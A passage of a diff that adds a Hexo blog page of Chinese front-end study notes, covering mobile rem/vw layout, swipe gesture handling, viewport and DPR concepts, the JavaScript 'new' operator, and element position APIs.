+<li>限制根元素字体大小的最大最小值，配合 body 加上最大宽度和最小宽度，实现布局宽度的最大最小限制<br>核心代码实现如下：<br>&#x2F;&#x2F; rem 单位换算：html的font-size定为 75px（即1rem） 只是方便运算，750px-75px、640-64px、1080px-108px，如此类推<br>$vw_fontsize: 75; &#x2F;&#x2F; iPhone 6尺寸的根元素大小基准值<br>@function rem($px) {<br>  @return ($px &#x2F; $vw_fontsize ) * 1rem;<br>}<br>&#x2F;&#x2F; 根元素大小使用 vw 单位<br>$vw_design: 750;<br>html {<br> font-size: ($vw_fontsize &#x2F; ($vw_design &#x2F; 2)) * 100vw;<br> &#x2F;&#x2F; 同时，通过Media Queries 限制根元素最大最小值<br> @media screen and (max-width: 320px) {<br> font-size: 64px;<br> }<br> @media screen and (min-width: 540px) {<br> font-size: 108px;<br> }<br>}<br>&#x2F;&#x2F; body 也增加最大最小宽度限制，避免默认100%宽度的 block 元素跟随 body 而过大过小<br>body {<br> max-width: 540px;<br> min-width: 320px;<br>}</li>
+</ol>
+<p>扩展阅读：<br><a target="_blank" rel="noopener" href="http://imweb.io/topic/5a523cc0a192c3b460fce3a5">http://imweb.io/topic/5a523cc0a192c3b460fce3a5</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000008767416">https://segmentfault.com/a/1190000008767416</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/04efb4a1d2f8">https://www.jianshu.com/p/04efb4a1d2f8</a><br><a target="_blank" rel="noopener" href="http://www.html-js.com/article/Mobile-terminal-H5-mobile-terminal-HD-multi-screen-adaptation-scheme%203041">http://www.html-js.com/article/Mobile-terminal-H5-mobile-terminal-HD-multi-screen-adaptation-scheme%203041</a><br>总结：<br>flexible.js 方案（参考上边后两篇）<br>——flexible.js，在html头部引入，用来获取dpr和定义不同设备上1rem是多少px , 同时会设置一些scale解决1px，用js进行px-rem转换等问题<br>        设计稿是用来计算元素的各种尺寸为多少rem的（比如750px宽的设计稿，定义75px位1rem——比例和flexible一样，然后以此计算rem值）</p>
+<p>vw布局方案同flexible.js需要在css中计算比例（px单位的长度是多少rem, 或者是多少vw）,不同的是vw方案不用指定不同终端中1rem是多少px，vm是css天然支持的单位，不同终端会按照总宽度为100vw的设定按比例分配。</p>
+<h3 id="滑屏应用："><a href="#滑屏应用：" class="headerlink" title="滑屏应用："></a>滑屏应用：</h3><p>手势动作判断是实现滑屏应用的核心逻辑。 对于上下滑屏应用，我们主要实现的手势动作有：瞬间的上下滑动和按住拖拽滑动。<br> 瞬间的上下滑动除了要考虑滑动的始末位置，还要考虑时间间隔，即滑动速度。若满足一定的速度则代表用户是果断切换上下屏的动作，反之，则是犹豫保留在当前屏的动作。<br>var _this &#x3D; this<br>var drag &#x3D; false<br>var y0 &#x3D; 0<br>var deltaY &#x3D; 0<br>var time0 &#x3D; 0</p>
+<p>this.$swiper.on(‘touchstart’, function (ev) {<br>  drag &#x3D; _this.$swiper<br>  y0 &#x3D; ev.touches[0].pageY<br>  time0 &#x3D; new Date()<br>})</p>
+<p>this.$swiper.on(‘touchend’, function (ev) {<br>  var interval &#x3D; new Date() - time0<br>  drag &#x3D; false<br>  &#x2F;&#x2F; 拖拽完成后，判断移动方向、移动速度和移动距离等<br>  &#x2F;&#x2F; 若划动速度满足，则执行上划或下划过渡动画。<br>  &#x2F;&#x2F; 若划动速度不满足，则判断是否划动距离是否大于阈值(如 Swiper 容器的高度的一半)，若大于则执行上划或下划过渡画面，反之回到当前活跃块。<br>  _this.panEnd(deltaY, deltaY &#x2F; interval)<br>})</p>
+<p>this.$swiper.on(‘touchmove’, function (ev) {<br>  if (drag) {<br>    deltaY &#x3D; ev.touches[0].pageY - y0<br>    &#x2F;&#x2F; 设置 .swiper-wrapper 按住拖拽的位移。<br>    _this.pan(deltaY)<br>  }<br>})<br>事实上，业界已经有许多很好用的判断手势动作的插件，如知名的 hammer.js 或 zepto 的 touch 模块。</p>
+<h3 id="移动端知识点之前的总结："><a href="#移动端知识点之前的总结：" class="headerlink" title="移动端知识点之前的总结："></a>移动端知识点之前的总结：</h3><p>布局视口：所以，在手机上，视口与移动端浏览器屏幕宽度不再相关联，是完全独立的，这个浏览器厂商定的视口被称为布局视口。<br>视觉视口：视觉视口是用户正在看到的网页的区域，大小是屏幕中CSS像素的数量。<br>理想视口：布局视口明显对用户是不友好的，完全忽略了手机本身的尺寸。理想视口是网页用户最理想的宽度，用户进入页面的时候不需要缩放。<br>                 解决各种浏览器兼容问题的理想视口设置：<meta name="viewport" content="width=device-width,initial-scale=1"><br>设备像素比：<br>缩放程度为100%时，设备像素比：dpr &#x3D; 设备像素（屏幕物理像素，单位pt） &#x2F; CSS像素(单位px) —— 可以通过JS得到： window.devicePixelRatio<br>即：dpr &#x3D; 屏幕横向设备像素 &#x2F; 理想视口的宽</p>
+<p>移动端的适配布局方案：<br>Flexible的布局方案（根本是rem）<br>vw（viewport单位）来做移动端的适配问题。</p>
+<p>Flexible承载的使命:</p>
+<ul>
+<li>根据dpr的值来修改viewport实现1px的线</li>
+<li>根据dpr的值来修改html的font-size，从而使用rem实现等比缩放（？好像是达到字体大小不变的效果吧）</li>
+<li>使用Hack手段用rem模拟vw特性（css hack — 浏览器兼容 的意思）<br>vw:</li>
+<li>各终端下的适配问题 — 不同的终端，我们面对的屏幕分辨率、DPR、1px、2x图等一系列的问题。只不过解决这些问题不再是使用Hack手段来处理，而是直接使用原生的CSS技术来处理的。</li>
+<li>Retina屏的细节处理<br>100vw &#x3D; 750px，即1vw &#x3D; 7.5px</li>
+</ul>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://github.com/riskers/blog/issues/17">https://github.com/riskers/blog/issues/17</a> （基础概念）<br><a target="_blank" rel="noopener" href="https://www.w3cplus.com/css/vw-for-layout.html%EF%BC%88Flexible%E6%96%B9%E6%A1%88%E5%92%8Cvw%E6%96%B9%E6%A1%88%E7%BB%BC%E8%BF%B0%EF%BC%89">https://www.w3cplus.com/css/vw-for-layout.html（Flexible方案和vw方案综述）</a><br><a target="_blank" rel="noopener" href="http://www.html-js.com/article/Mobile-terminal-H5-mobile-terminal-HD-multi-screen-adaptation-scheme%203041%EF%BC%88Flexible%E6%96%B9%E6%A1%88%EF%BC%89">http://www.html-js.com/article/Mobile-terminal-H5-mobile-terminal-HD-multi-screen-adaptation-scheme%203041（Flexible方案）</a><br><a target="_blank" rel="noopener" href="https://www.w3cplus.com/mobile/vw-layout-in-vue.html%EF%BC%88vw%E6%96%B9%E6%A1%88%EF%BC%89">https://www.w3cplus.com/mobile/vw-layout-in-vue.html（vw方案）</a></p>
+<h2 id="Js相关："><a href="#Js相关：" class="headerlink" title="Js相关："></a>Js相关：</h2><p><strong>new 操作发生了什么</strong><br>当代码 new Foo(…) 执行时，会发生以下事情：</p>
+<ol>
+<li>一个继承自 Foo.prototype 的新对象被创建。</li>
+<li>将 this 绑定到新创建的对象，执行构造函数中的代码（为新对象添加属性）</li>
+<li>由构造函数返回的对象就是 new 表达式的结果。如果构造函数没有显式返回一个对象，则使用步骤1创建的对象。（一般情况下，构造函数不返回值，但是用户可以选择主动返回对象，来覆盖正常的对象创建步骤）</li>
+</ol>
+<p>跟以下代码效果差不多：<br>function instantiate(fn, …rests) {<br>    var f &#x3D; Object.create(fn.prototype);<br>    var val &#x3D; fn.apply(f, rests);<br>    return isPrimitive(val) ? f : val;<br>}<br>function A() {}<br>a &#x3D; instantiate(A); </p>
+<p>Ps: isPrimitive() 太麻烦了，不是问题的核心，在此就不实现了<br>参考： <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/36440948">https://www.zhihu.com/question/36440948</a></p>
+<p><strong>router的实现：</strong><br><a target="_blank" rel="noopener" href="https://github.com/kaola-fed/blog/issues/137">https://github.com/kaola-fed/blog/issues/137</a></p>
+<p><strong>获取页面元素位置和宽高？</strong></p>
+<p>宽高：<br>clientHeight和clientWidth   content + padding<br>clientTop和clientLeft           左，上边框宽度 border<br>offsetHeight和offsetWidth  content + padding + border<br>offsetTop和offsetLeft.         元素的左上角（边框外边缘）与已定位的父容器（offsetParent对象）左上角的距离<br>offsetParent                        offsetParent指的是距该元素最近的position不为static的祖先元素，如果没有则指向body元素。</p>
+<p>位置：<br>&#x2F;&#x2F;取得元素x坐标<br>function pageX(elem) {<br>    return elem.offsetParent?(elem.offsetLeft+pageX(elem.offsetParent)):elem.offsetLeft;<br>}<br>&#x2F;&#x2F;取得元素y坐标<br>function pageY(elem) {<br>    return elem.offsetParent?(elem.offsetTop+pageY(elem.offsetParent)):elem.offsetTop;<br>} </p>
+<p>||</p>
+<p>getBoundingClientRect()方法。它返回一个对象，其中包含了left、right、top、bottom四个属性</p>
+<p>　　var X&#x3D; this.getBoundingClientRect().left;</p>
+<p>　　var Y &#x3D;this.getBoundingClientRect().top;<br>再加上滚动距离，就可以得到绝对位置</p>
+<p>　　var X&#x3D; this.getBoundingClientRect().left+document.documentElement.scrollLeft;</p>
+<p>　　var Y &#x3D;this.getBoundingClientRect().top+document.documentElement.scrollTop;</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/06/20/js%E6%B7%B1%E5%BA%A6%E6%80%9D%E8%80%83/" rel="prev" title="Js深度思考(主要是坑)">
+      <i class="fa fa-chevron-left"></i> Js深度思考(主要是坑)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/06/27/koa%E6%A0%B8%E5%BF%83/" rel="next" title="koa核心">
+      koa核心 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E7%9B%B8%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text">框架相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">中间件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83-x2F-%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="nav-number">3.</span> <span class="nav-text">编码规范&#x2F;辅助工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7"><span class="nav-number">4.</span> <span class="nav-text">开发工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E3%80%81%E7%BA%AF%E5%87%BD%E6%95%B0%E3%80%81%E9%AB%98%E9%98%B6%E7%BB%84%E4%BB%B6%E3%80%81%E6%9F%AF%E9%87%8C%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">函数式编程、纯函数、高阶组件、柯里化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Http%E5%92%8Chttps%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%8Chttps%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E6%98%AF%E5%A6%82%E4%BD%95%E7%9A%84%EF%BC%8Chttp2%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%9C%89%E4%BB%80%E4%B9%88%E5%A5%BD%E5%A4%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%86%B3%E7%8E%B0%E5%9C%A8%E7%9A%84%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">Http和https的区别，https的数据传输过程是如何的，http2是什么，有什么好处，可以解决现在的什么问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%9B%B8%E5%85%B3%EF%BC%9A"><span class="nav-number">7.</span> <span class="nav-text">工程化相关：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="nav-number">7.1.</span> <span class="nav-text">内存泄漏问题：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#node%E8%B7%AF%E5%BE%84%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99%EF%BC%9A"><span class="nav-number">7.2.</span> <span class="nav-text">node路径解析规则：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webpack%E6%A8%A1%E5%9D%97%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99%EF%BC%9A"><span class="nav-number">7.3.</span> <span class="nav-text">webpack模块解析规则：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%EF%BC%9A"><span class="nav-number">8.</span> <span class="nav-text">安全：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81XSS"><span class="nav-number">8.1.</span> <span class="nav-text">1、XSS:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81CSRF"><span class="nav-number">8.2.</span> <span class="nav-text">2、CSRF:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A"><span class="nav-number">8.3.</span> <span class="nav-text">扩展：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9B%B8%E5%85%B3"><span class="nav-number">9.</span> <span class="nav-text">移动端相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%8D%E5%BA%94%E5%BC%8F%E9%A1%B5%E9%9D%A2%E5%BC%80%E5%8F%91%EF%BC%9A"><span class="nav-number">9.1.</span> <span class="nav-text">响应式页面开发：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BB%91%E5%B1%8F%E5%BA%94%E7%94%A8%EF%BC%9A"><span class="nav-number">9.2.</span> <span class="nav-text">滑屏应用：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B9%8B%E5%89%8D%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">9.3.</span> <span class="nav-text">移动端知识点之前的总结：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Js%E7%9B%B8%E5%85%B3%EF%BC%9A"><span class="nav-number">10.</span> <span class="nav-text">Js相关：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">taoyingsong</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">taoyingsong</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '',
+      clientSecret: '',
+      repo        : '',
+      owner       : '',
+      admin       : [''],
+      id          : 'e1f04ace1409449fb92cf4d926d78b53',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
